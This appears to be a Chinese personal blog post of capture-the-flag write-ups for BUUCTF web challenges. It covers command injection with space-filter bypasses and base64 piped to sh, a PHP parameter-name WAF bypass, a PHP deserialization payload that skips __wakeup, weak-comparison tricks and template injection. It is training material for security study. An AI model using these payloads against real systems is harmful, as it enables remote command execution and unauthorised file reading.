

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="BUUé¢˜è®°">
  <meta name="author" content="OPN">
  <meta name="keywords" content="">
  
  <title>BUU - OPN&#39;S BLOG</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"opn90.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong> OPN'S BLOG </strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="BUU">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-10-21 13:35" pubdate>
        2021å¹´10æœˆ21æ—¥ ä¸‹åˆ
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      8.1k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      121
       åˆ†é’Ÿ
    </span>
  

  
  
    
      <!-- ä¸è’œå­ç»Ÿè®¡æ–‡ç« PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> æ¬¡
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">BUU</h1>
            
              <p class="note note-info">
                
                  æœ¬æ–‡æœ€åæ›´æ–°äºï¼š1 å°æ—¶å‰
                
              </p>
            
            <div class="markdown-body">
              <p>BUUé¢˜è®°</p>
<span id="more"></span>
<hr>
<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p><img src="/2021/10/21/BUU/pingpingping-1.png" srcset="/img/loading.gif" lazyload></p>
<div class="hljs code-wrapper"><pre><code>1|ls
//index.php flag.php
</code></pre></div>
<p>ç©ºæ ¼(space)è¿‡æ»¤ï¼Œ$IFS$1 ç»•è¿‡ ï¼ˆ$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œï¼‰</p>
<div class="hljs code-wrapper"><pre><code>1|cat$IFS$1index.php
</code></pre></div>
<p><img src="/2021/10/21/BUU/pingpingping-3.png" srcset="/img/loading.gif" lazyload></p>
<p>banäº†è¾ƒå¤šå­—ç¬¦ï¼Œå¹¶è´ªå©ªåŒ¹é…flagï¼Œå°è¯•å˜é‡æ‹¼æ¥</p>
<div class="hljs code-wrapper"><pre><code>1;a=g;cat$IFS$1fla$a.php
//get flag

//å‡ ç§é”™è¯¯å°è¯•
//â€”â€”*f*l*a*g*â€”â€”æ­£åˆ™åŒ¹é…å°†å…¶è¿‡æ»¤ï¼Œä»…éœ€æ”¹å˜é¡ºåºå³å¯â€”â€”
1;a=fla;cat$IFS$9$ag.php
1;a=f;b=l;c=a;d=g;cat$IFS$9$a$b$c$d.php
</code></pre></div>
<h2 id="ç®¡é“ç¬¦"><a href="#ç®¡é“ç¬¦" class="headerlink" title="ç®¡é“ç¬¦ |"></a>ç®¡é“ç¬¦ |</h2><p><img src="/2021/10/21/BUU/pingpingping-4.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>å¤šå‘½ä»¤æ‰§è¡Œç¬¦<br>; æ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥<br>| æ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœ<br>|| å½“å‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥<br>&amp; å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡<br>&amp;&amp; å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡ï¼Œåˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸ  </li>
</ul>
<h2 id="ç©ºæ ¼-space-è¿‡æ»¤"><a href="#ç©ºæ ¼-space-è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼(space)è¿‡æ»¤"></a>ç©ºæ ¼(space)è¿‡æ»¤</h2><div class="hljs code-wrapper"><pre><code>&#123;cat,flag.txt&#125;
$&#123;IFS&#125;
$IFS$9
&lt;
&lt;&gt;
%0a (æ¢è¡Œ)
%0dï¼ˆå›è½¦ï¼‰
%00
%09
%20
</code></pre></div>
<p>è§£é‡Šä¸€ä¸‹${IFS},$IFS,$IFS$9çš„åŒºåˆ«ï¼Œé¦–å…ˆ$IFSåœ¨linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œåªæœ‰cat$IFSa.txtçš„æ—¶å€™,bashè§£é‡Šå™¨ä¼šæŠŠæ•´ä¸ªIFSaå½“åšå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´æ²¡æœ‰åŠæ³•è¿è¡Œï¼Œç„¶è€Œå¦‚æœåŠ ä¸€ä¸ª{}å°±å›ºå®šäº†å˜é‡åï¼ŒåŒç†åœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ï¼Œè€Œ$9æŒ‡çš„æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå°±æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œå› æ­¤$9ç›¸å½“äºæ²¡æœ‰åŠ ä¸œè¥¿ï¼Œç­‰äºåšäº†ä¸€ä¸ªå‰åéš”ç¦»ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39808803/article/details/111341667">ã€Šdalaoåšå®¢ã€‹ï¼šhttps://blog.csdn.net/weixin_39808803/article/details/111341667</a></p>
<h2 id="è¿‡æ»¤bashç”¨shæ‰§è¡Œ"><a href="#è¿‡æ»¤bashç”¨shæ‰§è¡Œ" class="headerlink" title="è¿‡æ»¤bashç”¨shæ‰§è¡Œ"></a>è¿‡æ»¤bashç”¨shæ‰§è¡Œ</h2><div class="hljs code-wrapper"><pre><code>//å®˜æ–¹payload
/?ip=127.0.0.1;echo$IFS\$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
</code></pre></div>
<h2 id="å†…è”æ‰§è¡Œ"><a href="#å†…è”æ‰§è¡Œ" class="headerlink" title="å†…è”æ‰§è¡Œ"></a>å†…è”æ‰§è¡Œ</h2><p>å†…è”æ‰§è¡Œå°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ</p>
<div class="hljs code-wrapper"><pre><code>/?ip=1;cat$IFS$1`ls`
</code></pre></div>
<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>calc() CSSä¸­çš„è®¡ç®—å‡½æ•°</p>
<p><img src="/2021/10/21/BUU/EasyCalc-1.png" srcset="/img/loading.gif" lazyload></p>
<p>æŸ¥çœ‹æºç ï¼Œä¸€ä¸ªå‰ç«¯è¿‡æ»¤</p>
<p><img src="/2021/10/21/BUU/EasyCalc-2.png" srcset="/img/loading.gif" lazyload></p>
<p>è®¿é—®calc.php<br><img src="/2021/10/21/BUU/EasyCalc-3.png" srcset="/img/loading.gif" lazyload></p>
<div class="hljs code-wrapper"><pre><code>//æ‰«æ ¹ç›®å½•---&gt;f1agg
/calc.php/?num=var_dump(scandir(chr(47)))

// /f1agg--&gt;chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)
//get flag
/calc.php/? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
</code></pre></div>
<h2 id="å‰ç«¯è¿‡æ»¤â€“å˜é‡åå‰åŠ ç©ºæ ¼â€“PHPè§£ææ—¶å…ˆå°†å˜é‡çš„ç©ºæ ¼å»é™¤"><a href="#å‰ç«¯è¿‡æ»¤â€“å˜é‡åå‰åŠ ç©ºæ ¼â€“PHPè§£ææ—¶å…ˆå°†å˜é‡çš„ç©ºæ ¼å»é™¤" class="headerlink" title="å‰ç«¯è¿‡æ»¤â€“å˜é‡åå‰åŠ ç©ºæ ¼â€“PHPè§£ææ—¶å…ˆå°†å˜é‡çš„ç©ºæ ¼å»é™¤"></a>å‰ç«¯è¿‡æ»¤â€“å˜é‡åå‰åŠ ç©ºæ ¼â€“PHPè§£ææ—¶å…ˆå°†å˜é‡çš„ç©ºæ ¼å»é™¤</h2><p>ä¸ºä»€ä¹ˆè¦åœ¨numå‰åŠ ä¸€ä¸ªç©ºæ ¼ï¼Ÿ</p>
<p>ç­”ï¼šå‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼Œå¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼Œè¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</p>
<p>PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>ç­”ï¼š PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š<br>1.åˆ é™¤ç©ºç™½ç¬¦<br>2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰<br>ã€å½“wafä¸è®©ä½ è¿‡çš„æ—¶å€™ï¼Œphpå´å¯ä»¥è®©ä½ è¿‡ã€‘</p>
<h2 id="var-dump-scandir-è¯»å–æ ¹ç›®å½•"><a href="#var-dump-scandir-è¯»å–æ ¹ç›®å½•" class="headerlink" title="var_dump(scandir(\))è¯»å–æ ¹ç›®å½•"></a>var_dump(scandir(\))è¯»å–æ ¹ç›®å½•</h2><h2 id="file-get-contents-è¯»æ–‡ä»¶"><a href="#file-get-contents-è¯»æ–‡ä»¶" class="headerlink" title="file_get_contents()è¯»æ–‡ä»¶"></a>file_get_contents()è¯»æ–‡ä»¶</h2><h2 id="HTTPè¯·æ±‚èµ°ç§"><a href="#HTTPè¯·æ±‚èµ°ç§" class="headerlink" title="HTTPè¯·æ±‚èµ°ç§"></a>HTTPè¯·æ±‚èµ°ç§</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37865996/article/details/102529396">å…ˆä¸Šå¤§ä½¬åšå®¢ï¼šhttps://blog.csdn.net/qq_37865996/article/details/102529396</a></p>
<p>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚</p>
<p>â€¦â€¦â€¦â€¦â€¦â€¦â€¦..</p>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h1><p><img src="/2021/10/21/BUU/PHP-1.png" srcset="/img/loading.gif" lazyload></p>
<p>å¤‡ä»½ç½‘ç«™â€”&gt;<a target="_blank" rel="noopener" href="http://www.zip---&gt;ä¸‹è½½æºç /">www.zip---&gt;ä¸‹è½½æºç </a></p>
<p>index.php</p>
<p><img src="/2021/10/21/BUU/PHP-2.png" srcset="/img/loading.gif" lazyload></p>
<p>class.php</p>
<p><img src="/2021/10/21/BUU/PHP-3.png" srcset="/img/loading.gif" lazyload></p>
<p>æ€è·¯ï¼š  </p>
<p>1.ç±»é”€æ¯æ—¶ï¼Œusername=adminï¼Œpassword=100ï¼Œè¾“å‡ºflag</p>
<p>2.$select= (å®ä¾‹åŒ–Nameç±»-&gt;èµ‹å€¼-&gt;åºåˆ—åŒ–-&gt;ç»•è¿‡_wakeupé­”æœ¯æ–¹æ³•)</p>
<p>3.$selectä»…ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ$resç›¸å½“äºwaf</p>
<p>4.å½“$resé”€æ¯æ—¶ï¼Œè¾“å‡ºflag</p>
<p>exp</p>
<div class="hljs code-wrapper"><pre><code>&lt;?php
class Name&#123;
    private $username=&#39;admin&#39;;
    private $password=&#39;100&#39;;
&#125;
$a=new Name();
$b=serialize($a);    //ä¿®æ”¹å˜é‡ä¸ªæ•°ï¼Œåœ¨æ¯ä¸ªç±»åå’Œå­—æ®µåå‰åŠ %00
print_r($b);

//è¿›è¡Œurlç¼–ç ï¼Œé˜²æ­¢%00å¯¹åº”çš„ä¸å¯æ‰“å°å­—ç¬¦åœ¨å¤åˆ¶æ—¶ä¸¢å¤±
$c=urlencode(serialize($a));    //ä¿®æ”¹å˜é‡ä¸ªæ•°
print_r($c);
</code></pre></div>
<h2 id="publicã€protectedä¸privateåœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«"><a href="#publicã€protectedä¸privateåœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«" class="headerlink" title="publicã€protectedä¸privateåœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«"></a>publicã€protectedä¸privateåœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«</h2><p>protected å£°æ˜çš„å­—æ®µä¸ºä¿æŠ¤å­—æ®µï¼Œåœ¨æ‰€å£°æ˜çš„ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­å¯è§ï¼Œä½†åœ¨è¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­ä¸å¯è§ã€‚å› æ­¤ä¿æŠ¤å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š\0*\0çš„å‰ç¼€ã€‚è¿™é‡Œçš„ \0 è¡¨ç¤º ASCII ç ä¸º 0 çš„å­—ç¬¦(ä¸å¯è§å­—ç¬¦)ï¼Œè€Œä¸æ˜¯ \0 ç»„åˆã€‚è¿™ä¹Ÿè®¸è§£é‡Šäº†ï¼Œä¸ºä»€ä¹ˆå¦‚æœç›´æ¥åœ¨ç½‘å€ä¸Šï¼Œä¼ é€’\0*\0usernameä¼šæŠ¥é”™ï¼Œå› ä¸ºå®é™…ä¸Šå¹¶ä¸æ˜¯\0ï¼Œåªæ˜¯ç”¨å®ƒæ¥ä»£æ›¿ASCIIå€¼ä¸º0çš„å­—ç¬¦ã€‚å¿…é¡»ç”¨pythonä¼ å€¼æ‰å¯ä»¥ã€‚</p>
<p>private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š\0çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦ã€‚å…¶ä¸­ \0 å­—ç¬¦ä¹Ÿæ˜¯è®¡ç®—é•¿åº¦çš„ã€‚</p>
<p>publicæ— æ ‡è®°ï¼Œå˜é‡åä¸å˜ï¼Œé•¿åº¦ä¸å˜<br>protectedåœ¨å˜é‡åå‰æ·»åŠ æ ‡è®°\00*\00ï¼Œé•¿åº¦+3<br>privateåœ¨å˜é‡åå‰æ·»åŠ æ ‡è®°\00(classname)\00ï¼Œé•¿åº¦+2+ç±»åé•¿åº¦</p>
<h2 id="wakeupç»•è¿‡æ–¹æ³•"><a href="#wakeupç»•è¿‡æ–¹æ³•" class="headerlink" title="_wakeupç»•è¿‡æ–¹æ³•"></a>_wakeupç»•è¿‡æ–¹æ³•</h2><p>unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚ </p>
<p> <big> åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äº çœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ </big> </p>
<div class="hljs code-wrapper"><pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;
O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
//å°†å˜é‡ä¸ªæ•°2-&gt;3
O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;
O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
</code></pre></div>
<p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/11/03/php-wakeup/">è´´ä¸Šå¤§ä½¬åšå®¢ï¼šhttps://blog.spoock.com/2016/11/03/php-wakeup/</a></p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h1><p><img src="/2021/10/21/BUU/BackupFile-1.png" srcset="/img/loading.gif" lazyload></p>
<p>get å¤‡ä»½æ–‡ä»¶â€”&gt; index.php.bak</p>
<div class="hljs code-wrapper"><pre><code>&lt;?php
include_once &quot;flag.php&quot;;

if(isset($_GET[&#39;key&#39;])) &#123;
    $key = $_GET[&#39;key&#39;];
    if(!is_numeric($key)) &#123;     //éœ€è¦ç»•è¿‡æ•°å­—åˆ¤æ–­
        exit(&quot;Just num!&quot;);
    &#125;
    $key = intval($key);        //è·å–æ•´æ•°å€¼
    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
    if($key == $str) &#123;        //å¼±ç±»å‹æ¯”è¾ƒ å°†$strè½¬æ¢ä¸ºintå‹å†è¿›è¡Œæ¯”è¾ƒ =&gt; $str=123
        echo $flag;
    &#125;
&#125;
else &#123;
    echo &quot;Try to find out source file!&quot;;
&#125;
</code></pre></div>
<p>payloadï¼š</p>
<div class="hljs code-wrapper"><pre><code>/?key=123
</code></pre></div>
<h2 id="å¸¸è§å¤‡ä»½æ–‡ä»¶æ³„éœ²"><a href="#å¸¸è§å¤‡ä»½æ–‡ä»¶æ³„éœ²" class="headerlink" title="å¸¸è§å¤‡ä»½æ–‡ä»¶æ³„éœ²"></a>å¸¸è§å¤‡ä»½æ–‡ä»¶æ³„éœ²</h2><div class="hljs code-wrapper"><pre><code>.rar .zip .7z .tar.gz .bak .swp .txt .html
</code></pre></div>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78165051?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task">å¤‡ä»½æ–‡ä»¶å‚è€ƒæ³„éœ²æ–‡çŒ®</a></p>
<h2 id="PHPå¼±ç±»å‹æ¯”è¾ƒ"><a href="#PHPå¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="PHPå¼±ç±»å‹æ¯”è¾ƒ"></a>PHPå¼±ç±»å‹æ¯”è¾ƒ</h2><p>//å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒï¼Œè½¬æ¢ä¸ºæ•°å­—<br>//çœ‹å­—ç¬¦ä¸²å¼€å¤´<br>//123adminâ€“&gt;123<br>//admin123â€“&gt;0  </p>
<p>///å­—ç¬¦ä¸²ä»¥xexå¼€å¤´(xè¡¨ç¤ºæ•°å­—)ï¼Œä¼šè¢«è½¬æ¢ä¸ºç§‘å­¦è®¡æ•°æ³•</p>
<h1 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h1><p>tornadoâ€”pythonæ¡†æ¶</p>
<p>ç®€å•äº†è§£äº†ä¸€ä¸‹sstiåŸç†ï¼Œ<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">SSTIé“¾æ¥</a><br><a target="_blank" rel="noopener" href="https://jiang-niao.github.io/2020/04/02/SSTi%20%E5%85%A8%E8%A7%A3%E6%9E%90/#SSTi-%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89">SSTi å­¦ä¹ </a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172">SSTI/æ²™ç›’é€ƒé€¸è¯¦ç»†æ€»ç»“ </a><br>ç®€å•æ¥è¯´ï¼Œ å½“ç”¨æˆ·çš„è¾“å…¥æ•°æ®æ²¡æœ‰è¢«åˆç†çš„å¤„ç†æ§åˆ¶æ—¶ï¼Œå°±æœ‰å¯èƒ½æ•°æ®æ’å…¥äº†ç¨‹åºæ®µä¸­å˜æˆäº†ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œæ”¹å˜äº†ç¨‹åºçš„æ‰§è¡Œé€»è¾‘</p>
<p><img src="/2021/10/21/BUU/easy_tornado-2.png" srcset="/img/loading.gif" lazyload> </p>
<p><img src="/2021/10/21/BUU/easy_tornado-3.png" srcset="/img/loading.gif" lazyload>  </p>
<p><img src="/2021/10/21/BUU/easy_tornado-1.png" srcset="/img/loading.gif" lazyload></p>
<div class="hljs code-wrapper"><pre><code>flag in /fllllllllllllag  
render  
md5(cookie_secret+md5(filename))  

flagåœ¨/fllllllllllllag  
render--æ¨¡æ¿æ³¨å…¥  
filehashç®—æ³•
</code></pre></div>
<p>æ€è·¯ï¼š  </p>
<ol>
<li>å¯»æ‰¾æ³¨å…¥ç‚¹  </li>
<li>è·å–cookie_secretå€¼  </li>
<li>æ„é€ expï¼Œget flag  </li>
</ol>
<div class="hljs code-wrapper"><pre><code>/file?filename=/flag.txt&amp;filehash=e50a4209e8ef4fa0a665b4dfbdc26e37

